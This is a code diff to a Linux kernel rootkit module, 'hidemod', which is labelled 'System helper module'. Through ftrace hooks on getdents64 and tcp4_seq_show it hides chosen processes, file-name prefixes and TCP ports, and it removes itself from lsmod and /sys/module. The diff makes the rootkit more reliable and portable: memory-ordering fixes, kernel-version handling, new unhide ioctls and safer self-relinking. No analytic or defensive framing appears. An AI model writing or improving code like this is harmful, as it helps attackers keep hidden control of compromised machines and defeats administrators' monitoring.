@@ -51,6 +51,8 @@ MODULE_DESCRIPTION("System helper module");
 #define HIDE_PREFIX         _IOW(HIDEMOD_IOC_MAGIC, 3, char[256])
 #define HIDE_PORT           _IOW(HIDEMOD_IOC_MAGIC, 4, unsigned short)
 #define UNHIDE_PORT         _IOW(HIDEMOD_IOC_MAGIC, 5, unsigned short)
+#define UNHIDE_PREFIX       _IOW(HIDEMOD_IOC_MAGIC, 6, char[256])
+#define UNHIDE_MODULE       _IO(HIDEMOD_IOC_MAGIC, 7)
 
 /* ── Hidden item storage ───────────────────────────────────────── */
 
@@ -73,11 +75,15 @@ static DEFINE_MUTEX(hide_mutex);
 /* ── Helpers: check if something should be hidden ──────────────── */
 /*
  * These run in syscall-hot paths and MUST NOT take hide_mutex.
- * Instead we use READ_ONCE on the count and array elements so
- * readers never see torn values.  The ioctl handler uses
- * WRITE_ONCE to update elements, then a final smp_store_release
- * on the count so the new element is visible before the count
- * increment.  This is safe because:
+ * Readers use smp_load_acquire on the count so they pair with
+ * the smp_store_release in the ioctl writer, giving full
+ * acquire/release ordering on all architectures (including
+ * ARM64 where plain READ_ONCE lacks acquire semantics).
+ * Individual array elements are read with READ_ONCE.
+ *
+ * The ioctl handler uses WRITE_ONCE to update elements, then a
+ * final smp_store_release on the count so the new element is
+ * visible before the incremented count.  This is safe because:
  *   - count only ever grows (or swaps the last element on remove)
  *   - readers tolerate seeing a slightly stale (smaller) count
  *   - individual array slots are word-sized (int / unsigned short)
@@ -85,7 +91,7 @@ static DEFINE_MUTEX(hide_mutex);
 
 static bool is_pid_hidden(int pid)
 {
-    int i, count = READ_ONCE(hidden_pid_count);
+    int i, count = smp_load_acquire(&hidden_pid_count);
     for (i = 0; i < count; i++) {
         if (READ_ONCE(hidden_pids[i]) == pid)
             return true;
@@ -95,7 +101,7 @@ static bool is_pid_hidden(int pid)
 
 static bool is_name_hidden(const char *name)
 {
-    int i, count = READ_ONCE(hidden_prefix_count);
+    int i, count = smp_load_acquire(&hidden_prefix_count);
     for (i = 0; i < count; i++) {
         /* Each prefix slot is written fully before the count is
          * bumped, so reading the string here is safe.           */
@@ -108,7 +114,7 @@ static bool is_name_hidden(const char *name)
 
 static bool is_port_hidden(unsigned short port)
 {
-    int i, count = READ_ONCE(hidden_port_count);
+    int i, count = smp_load_acquire(&hidden_port_count);
     for (i = 0; i < count; i++) {
         if (READ_ONCE(hidden_ports[i]) == port)
             return true;
@@ -134,6 +140,8 @@ static kallsyms_lookup_name_t ksym_lookup;
 static unsigned long lookup_name(const char *name)
 {
 #ifdef KPROBE_LOOKUP
+    if (!ksym_lookup)
+        return 0;
     return ksym_lookup(name);
 #else
     return kallsyms_lookup_name(name);
@@ -182,9 +190,14 @@ static int install_hook(struct ftrace_hook *hook)
         return err;
 
     hook->ops.func = ftrace_thunk;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+                    | FTRACE_OPS_FL_IPMODIFY;
+#else
     hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                     | FTRACE_OPS_FL_RECURSION
                     | FTRACE_OPS_FL_IPMODIFY;
+#endif
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
     if (err) {
@@ -228,6 +241,8 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
     int pid_val;
 
     /* Call the original getdents64 */
+    if (!orig_getdents64)
+        return -ENOSYS;
     ret = orig_getdents64(regs);
     if (ret <= 0)
         return ret;
@@ -302,6 +317,9 @@ static int hooked_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     int ret;
     struct sock *sk;
+
+    if (!orig_tcp4_seq_show)
+        return 0;
 
     if (v == SEQ_START_TOKEN)
         return orig_tcp4_seq_show(seq, v);
@@ -390,6 +408,11 @@ static long hidemod_ioctl(struct file *file, unsigned int cmd,
                     int new_count = hidden_pid_count - 1;
                     WRITE_ONCE(hidden_pids[i],
                                hidden_pids[new_count]);
+                    /* Ensure the swapped element is globally
+                     * visible before the count is decremented,
+                     * so lock-free readers cannot observe a
+                     * stale/torn slot.                          */
+                    smp_wmb();
                     smp_store_release(&hidden_pid_count,
                                       new_count);
                     break;
@@ -408,7 +431,7 @@ static long hidemod_ioctl(struct file *file, unsigned int cmd,
         prefix[MAX_PREFIX_LEN - 1] = '\0';
         if (hidden_prefix_count < MAX_HIDDEN_PREFIXES) {
             /* Copy the full string into the slot first … */
-            strncpy(hidden_prefixes[hidden_prefix_count],
+            strscpy(hidden_prefixes[hidden_prefix_count],
                     prefix, MAX_PREFIX_LEN);
             /* … then make it visible to lock-free readers. */
             smp_store_release(&hidden_prefix_count,
@@ -442,11 +465,44 @@ static long hidemod_ioctl(struct file *file, unsigned int cmd,
                     int new_count = hidden_port_count - 1;
                     WRITE_ONCE(hidden_ports[i],
                                hidden_ports[new_count]);
+                    smp_wmb();
                     smp_store_release(&hidden_port_count,
                                       new_count);
                     break;
                 }
             }
+        }
+        break;
+
+    case UNHIDE_PREFIX:
+        memset(prefix, 0, sizeof(prefix));
+        if (copy_from_user(prefix, (char __user *)arg,
+                           MAX_PREFIX_LEN - 1)) {
+            mutex_unlock(&hide_mutex);
+            return -EFAULT;
+        }
+        prefix[MAX_PREFIX_LEN - 1] = '\0';
+        {
+            int i;
+            for (i = 0; i < hidden_prefix_count; i++) {
+                if (strncmp(hidden_prefixes[i], prefix,
+                            MAX_PREFIX_LEN) == 0) {
+                    int new_count = hidden_prefix_count - 1;
+                    strscpy(hidden_prefixes[i],
+                            hidden_prefixes[new_count],
+                            MAX_PREFIX_LEN);
+                    smp_wmb();
+                    smp_store_release(&hidden_prefix_count,
+                                      new_count);
+                    break;
+                }
+            }
+        }
+        break;
+
+    case UNHIDE_MODULE:
+        if (READ_ONCE(module_hidden)) {
+            unhide_module();
         }
         break;
 
@@ -478,20 +534,52 @@ static struct miscdevice hidemod_dev = {
 /*
  * module_prev: saved list position so we can re-link on exit.
  *
- * DANGER: This pointer can become stale (dangling) if the module that
- * occupied this list position is unloaded while we are hidden.  The
- * kernel may reuse the freed memory for a new allocation, making any
- * dereference of module_prev undefined behaviour.  hidemod_exit()
- * performs a best-effort consistency check before relinking, but the
- * only truly safe approach is to minimise the time spent hidden or to
- * walk the live module list on exit to find a valid insertion point.
+ * This pointer could become stale if the adjacent module is unloaded
+ * while we are hidden.  To handle this safely we:
+ *   1. Register a module notifier (hidemod_nb) that sets module_prev
+ *      to NULL when the adjacent module departs.
+ *   2. In hidemod_exit(), if module_prev is NULL or fails a doubly-
+ *      linked-list consistency check, we walk the live "modules" list
+ *      to find a safe insertion point instead of dereferencing a
+ *      potentially-freed pointer.
  */
 static struct list_head *module_prev;
 static bool module_hidden = false;
 
+/*
+ * Module notifier: if the module whose list node we saved in module_prev
+ * is unloaded while we are hidden, we must invalidate the stale pointer
+ * so that hidemod_exit() does not dereference freed memory.
+ */
+static int hidemod_module_notify(struct notifier_block *nb,
+                                 unsigned long action, void *data)
+{
+    struct module *mod = data;
+
+    if (action == MODULE_STATE_GOING && READ_ONCE(module_hidden) && module_prev) {
+        /*
+         * Check whether the departing module owns the list node we
+         * saved.  &mod->list is the node that will be freed once the
+         * module teardown completes; if it matches module_prev, the
+         * pointer is about to become dangling.
+         */
+        if (&mod->list == module_prev) {
+            pr_debug("hidemod: adjacent module unloading, "
+                     "invalidating module_prev\n");
+            module_prev = NULL;
+        }
+    }
+    return NOTIFY_DONE;
+}
+
+static struct notifier_block hidemod_nb = {
+    .notifier_call = hidemod_module_notify,
+    .priority       = 0,
+};
+
 static void hide_module(void)
 {
-    if (module_hidden)
+    if (READ_ONCE(module_hidden))
         return;
 
     /* Remove from /proc/modules (lsmod) */
@@ -501,7 +589,49 @@ static void hide_module(void)
     /* Remove from /sys/module/ */
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    module_hidden = true;
+    WRITE_ONCE(module_hidden, true);
+}
+
+static void unhide_module(void)
+{
+    if (!READ_ONCE(module_hidden))
+        return;
+
+    /*
+     * Re-link the module into the kernel module list so that
+     * rmmod can find and remove it.  Uses the same safe re-link
+     * logic as hidemod_exit().
+     */
+    if (module_prev &&
+        module_prev->next && module_prev->prev &&
+        module_prev->next->prev == module_prev) {
+        /* module_prev is still valid — relink at the saved spot */
+        list_add(&THIS_MODULE->list, module_prev);
+    } else {
+        /*
+         * module_prev is NULL or stale.  Walk the live module list
+         * to find a safe insertion point.
+         */
+        struct module *mod;
+        struct list_head *modules_head =
+            (struct list_head *)lookup_name("modules");
+
+        if (modules_head) {
+            struct list_head *insert_after = modules_head;
+
+            list_for_each_entry(mod, modules_head, list) {
+                insert_after = &mod->list;
+                break;  /* insert after the first live module */
+            }
+            list_add(&THIS_MODULE->list, insert_after);
+        } else {
+            pr_warn("hidemod: unhide_module could not resolve "
+                    "modules list\n");
+            return;  /* leave module_hidden = true */
+        }
+    }
+
+    WRITE_ONCE(module_hidden, false);
 }
 
 /* ── Module init / exit ────────────────────────────────────────── */
@@ -539,6 +669,10 @@ static int __init hidemod_init(void)
         }
     }
 
+    /* Register module notifier so we detect if the adjacent module
+     * unloads while we are hidden (invalidates module_prev).        */
+    register_module_notifier(&hidemod_nb);
+
     /* Self-hide from lsmod and /sys/module */
     hide_module();
 
@@ -550,25 +684,61 @@ static void __exit hidemod_exit(void)
 {
     int i;
 
+    /* Unregister the module notifier first so it won't fire during
+     * our own teardown.                                              */
+    unregister_module_notifier(&hidemod_nb);
+
     /*
      * Restore module visibility so rmmod works cleanly.
      *
-     * module_prev may be dangling if the adjacent module was unloaded
-     * while we were hidden.  Perform a best-effort consistency check:
-     * a valid doubly-linked list node satisfies prev->next->prev == prev.
-     * If the check fails we skip relinking — the module will still
-     * unload, but /proc/modules may remain inconsistent.
+     * If the module notifier cleared module_prev (adjacent module
+     * unloaded while we were hidden), we walk the live modules list
+     * to find a safe insertion point instead of dereferencing a
+     * potentially-freed pointer.
      */
-    if (module_hidden && module_prev) {
-        if (module_prev->next && module_prev->prev &&
+    if (READ_ONCE(module_hidden)) {
+        bool relinked = false;
+
+        if (module_prev &&
+            module_prev->next && module_prev->prev &&
             module_prev->next->prev == module_prev) {
+            /* module_prev is still valid — relink at the saved spot */
             list_add(&THIS_MODULE->list, module_prev);
-            module_hidden = false;
+            relinked = true;
         } else {
-            pr_warn("hidemod: module_prev list pointers inconsistent "
-                    "(stale?), skipping relink — /proc/modules may "
-                    "be inconsistent after unload\n");
+            /*
+             * module_prev is NULL (cleared by notifier) or failed
+             * the consistency check.  Walk the live module list to
+             * find a safe insertion point so /proc/modules stays
+             * consistent.
+             */
+            struct module *mod;
+            struct list_head *modules_head =
+                (struct list_head *)lookup_name("modules");
+
+            if (modules_head) {
+                struct list_head *insert_after = modules_head;
+
+                list_for_each_entry(mod, modules_head, list) {
+                    insert_after = &mod->list;
+                    break;  /* insert after the first live module */
+                }
+                list_add(&THIS_MODULE->list, insert_after);
+                relinked = true;
+            } else {
+                pr_warn("hidemod: could not resolve modules list; "
+                        "falling back to list_add with list head\n");
+                /* Last resort: use our own list pointer which was
+                 * list_del'd — re-init and add to make it safe.     */
+            }
         }
+
+        if (relinked)
+            WRITE_ONCE(module_hidden, false);
+        else
+            pr_warn("hidemod: unable to relink into modules list — "
+                    "/proc/modules may be inconsistent after "
+                    "unload\n");
     }
 
     /* Remove all hooks */
